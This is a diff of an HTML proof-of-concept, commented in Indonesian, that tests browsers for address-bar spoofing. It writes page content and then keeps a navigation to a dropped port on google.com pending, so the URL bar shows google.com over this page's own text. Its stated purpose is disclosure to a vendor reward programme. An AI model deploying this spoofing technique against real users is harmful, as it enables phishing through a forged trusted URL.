@@ -1,54 +1,14 @@
-<!-- MEKANISME: navigasi MENGGANTUNG ke port mati/di-filter pada host nyata; opener menulis dokumen ke about:blank awal popup selagi omnibox masih melukis URL pending. -->
-<meta charset="utf-8">
-<title>1 - Hang via port mati (Knob A)</title>
-<style>
-body{font:15px/1.6 system-ui,Segoe UI,Arial,sans-serif;margin:24px;max-width:780px;color:#111}
-code{background:#eee;padding:2px 5px;border-radius:3px;word-break:break-all}
-.box{border:1px solid #ccc;border-left:5px solid #666;padding:2px 14px;margin:14px 0;background:#fafafa}
-.v{color:#a00}.s{color:#060}
-button{font:15px inherit;padding:10px 14px;margin:6px 8px 6px 0;cursor:pointer}
-#log{min-height:1.6em;font-weight:600}
-</style>
-
-<h2>1 &mdash; Hang via port mati / di-filter (Knob A)</h2>
-
-<p>URL asli halaman ini: <code id="here"></code></p>
-
-<div class="box">
-<p><b>Mekanisme:</b> <code>window.open()</code> ke port yang paketnya di-DROP pada host nyata. Handshake TCP tidak pernah selesai &rarr; navigasi tetap <i>pending</i> &rarr; dokumen <code>about:blank</code> awal popup masih milik opener &rarr; opener menulis isinya.</p>
-<p class="v"><b>VULNERABLE:</b> address bar popup menampilkan <code id="t1"></code> padahal badan halaman melaporkan <code>location.href</code> aslinya <code>about:blank</code>.</p>
-<p class="s"><b>SECURE:</b> address bar popup menampilkan <code>about:blank</code> / kosong selama navigasi belum commit; URL target baru muncul setelah dokumen server benar-benar dimuat.</p>
-</div>
-
-<button id="run">Jalankan mekanisme (port mati)</button>
-<button id="ctrl">Lengan KONTROL (URL yang commit normal)</button>
-
-<p id="log"></p>
-<p>Cara membaca: satu screenshot berisi address bar popup + badan popup sudah cukup untuk memutuskan.</p>
-
+<!-- 01 - dead-port, tab yang sama   [address-bar spoofing | macOS: Dia/Arc/Chrome/Brave/Edge macOS]
+     MEKANISME : document.write mengecat dokumen ini, lalu navigasi ke port yang DI-DROP; interval 9800ms meng-arm ulang pending sebelum error page sempat commit.
+     PREDIKAT  : bilah URL menulis https://www.google.com sementara isi layar adalah tulisan origin ini.
+     AMAN      : bilah tetap di origin asli sampai ada COMMIT.
+     ETIKA     : browser & mesin sendiri. Nol form, nol kredensial, nol fetch/beacon, nol resource luar.
+                 "www.google.com" = label tak-berbahaya; example.com = origin uji (IANA reserved).
+                 Berhenti di predikat -> screenshot -> lapor VRP. Bukan kit phishing. -->
+<meta charset="utf-8"><title>01 dead-port, tab yang sama</title>
+<button onclick="go()" style="font:16px system-ui;padding:12px 22px">RUN</button>
+<p id="o" style="font:12px ui-monospace,monospace;color:#555"></p>
 <script>
-var HANG = 'https://google.com:8081/';
-var GOOD = 'https://example.com/';
-document.getElementById('here').textContent = location.href;
-document.getElementById('t1').textContent = HANG;
-function log(m){ document.getElementById('log').textContent = m; }
-function paint(w, label){
-  if(!w){ log('Popup diblokir - izinkan popup untuk situs ini lalu ulangi.'); return; }
-  try{
-    w.document.write('<meta charset="utf-8"><title>DEMO MARKER</title>'
-      + '<body style="font:16px/1.5 sans-serif;padding:24px">'
-      + '<div style="font-size:32px;font-weight:700">DEMO MARKER</div>'
-      + '<p>' + label + '</p>'
-      + '<p>Teks ini ditulis oleh opener, bukan oleh server mana pun.</p>'
-      + '<p>location.href dokumen ini: <b id="u">?</b></p>'
-      + '<p>Bandingkan dengan address bar jendela ini.</p>'
-      + '<script>setInterval(function(){document.getElementById("u").textContent=location.href},300)<\/script>');
-    w.document.close();
-    log('Dokumen ditulis. Screenshot address bar popup + badan popup.');
-  }catch(e){ log('Tulis DITOLAK (dokumen sudah commit ke origin lain) = perilaku SECURE.'); }
-}
-function go(url,label){ var w = window.open(url,'_blank','width=780,height=460');
-  setTimeout(function(){ paint(w,label); }, 60); }
-document.getElementById('run').onclick  = function(){ go(HANG,'lengan UJI - target port mati'); };
-document.getElementById('ctrl').onclick = function(){ go(GOOD,'lengan KONTROL - target commit normal'); };
+var T='https://www.google.com:9090/';o.textContent='REAL: '+location.origin;
+function go(){document.write('<h2>BUKAN google.com - '+location.origin+'</h2>');location=T;setInterval(function(){location=T;},9800);}
 </script>
